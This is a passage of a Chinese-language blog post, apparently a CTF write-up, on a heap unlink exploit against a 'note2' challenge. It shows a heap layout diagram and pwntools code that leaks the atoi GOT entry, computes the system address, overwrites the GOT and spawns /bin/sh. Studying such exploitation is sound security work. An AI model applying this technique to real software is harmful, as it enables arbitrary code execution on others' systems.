+                                   +-----------------+
+                                   |   <span class="hljs-string">'\x00'</span>+<span class="hljs-string">'b'</span>*<span class="hljs-number">7</span>  |
+                ptr[<span class="hljs-number">2</span>]-----------&gt; +-----------------+ chunk <span class="hljs-number">2</span>
+                                   |    <span class="hljs-built_in">size</span>=<span class="hljs-number">0x90</span>    | &lt;=原本的<span class="hljs-number">0x91</span>变为了<span class="hljs-number">0x90</span>标记期末为空闲
+                                   +-----------------+
+                                   |    <span class="hljs-number">0xa0</span>         |
+                                   +-----------------|------------
+                                   |    <span class="hljs-string">'a'</span>*<span class="hljs-number">8</span>        |
+                                   +-----------------+
+                                   |    <span class="hljs-string">'a'</span>*<span class="hljs-number">8</span>        |
+                 ptr[<span class="hljs-number">1</span>]----------&gt; +-----------------+ chunk <span class="hljs-number">1</span>
+                                   |    <span class="hljs-built_in">size</span>=<span class="hljs-number">0x20</span>    |
+                                   +-----------------+
+                                   |    prevsize     |
+                                   +-----------------|-------------
+                                   |    unused       |
+                                   +-----------------+
+                                   |  prev_size=<span class="hljs-number">0x60</span> |
+fake ptr[<span class="hljs-number">0</span>] chunk<span class="hljs-number">'</span>s nextchunk-----&gt;+-----------------+
+                                   |    <span class="hljs-number">64</span>*<span class="hljs-string">'a'</span>       |
+                                   +-----------------+
+                                   |    fakebk       |
+                                   +-----------------+
+                                   |    fakefd       |
+                                   +-----------------+
+                                   |    <span class="hljs-number">0x61</span>         |  chunk <span class="hljs-number">0</span>
+                                   +-----------------+
+                                   |    'a *8        |
+                 ptr[<span class="hljs-number">0</span>]----------&gt; +-----------------+
+                                   |    <span class="hljs-built_in">size</span>=<span class="hljs-number">0x91</span>    |
+                                   +-----------------+
+                                   |    prev_size    |
+                                   +-----------------+  low addr
+                                           图<span class="hljs-number">2</span></code></pre>
+
+<p>该覆盖主要是为了释放chunk2的时候可以后向合并（合并低地址），对chunk0中虚拟构造的chunk进行unlink。即将要执行的操作为unlink(ptr[0])，同时我们所构造的fakebk和fakefd满足如下约束</p>
+<pre><code class="hljs c"><span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))                      \</code></pre>
+
+<p>unlink成功执行，会导致ptr[0]所存储的地址变为fakebk，即ptr-0x18。</p>
+<p><strong>实现了任意地址读！</strong></p>
+<h4 id="获取system地址"><a href="#获取system地址" class="headerlink" title="获取system地址"></a>获取system地址</h4><p>代码如下</p>
+<pre><code class="hljs python"><span class="hljs-comment"># overwrite the chunk0(which is ptr[0]) with got atoi</span>
+atoi_got = note2.got[<span class="hljs-string">'atoi'</span>]
+content = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x18</span> + p64(atoi_got)
+editnote(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, content)
+<span class="hljs-comment"># get the aoti addr</span>
+shownote(<span class="hljs-number">0</span>)
+
+sh.recvuntil(<span class="hljs-string">'is '</span>)
+atoi_addr = sh.recvuntil(<span class="hljs-string">'\n'</span>, drop=<span class="hljs-literal">True</span>)
+<span class="hljs-keyword">print</span> atoi_addr
+atoi_addr = u64(atoi_addr.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\x00'</span>))
+<span class="hljs-keyword">print</span> <span class="hljs-string">'leak atoi addr: '</span> + hex(atoi_addr)
+
+<span class="hljs-comment"># get system addr</span>
+atoi_offest = libc.symbols[<span class="hljs-string">'atoi'</span>]
+libcbase = atoi_addr - atoi_offest
+system_offest = libc.symbols[<span class="hljs-string">'system'</span>]
+system_addr = libcbase + system_offest
+
+<span class="hljs-keyword">print</span> <span class="hljs-string">'leak system addr: '</span>, hex(system_addr)</code></pre>
+
+<p>我们修改ptr[0]的内容为 ptr 的地址-0x18，所以当我们再次编辑 note0 时，可以覆盖ptr[0]的内容。这里我们将其覆盖为atoi的地址。<br>这样的话，如果我们查看note 0的内容，其实查看的就是atoi的地址。<strong>(被填充入的地址)</strong></p>
+<p>之后我们根据 libc 中对应的偏移计算出 system 的地址。</p>
+<h4 id="修改atoi-got"><a href="#修改atoi-got" class="headerlink" title="修改atoi got"></a>修改atoi got</h4><pre><code class="hljs python"><span class="hljs-comment"># overwrite the atoi got with systemaddr</span>
+content = p64(system_addr)
+editnote(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, content)</code></pre>
+
+<p>由于此时 ptr[0] 的地址 got 表的地址，所以我们可以直接修改该 note，覆盖为 system 地址。</p>
+<h4 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h4><pre><code class="hljs python"><span class="hljs-comment"># get shell</span>
+sh.recvuntil(<span class="hljs-string">'option---&gt;&gt;'</span>)
+sh.sendline(<span class="hljs-string">'/bin/sh'</span>)
+sh.interactive()</code></pre>
+
+<p>此时如果我们再调用 atoi ，其实调用的就是 system 函数，所以就可以拿到shell了。</p>
+
+            </article>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/07/10/hello-world/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Hello World</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-6">
+                    
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+    </div>
+	<div>
+		Create by 7and 2020.
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+
+
+
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
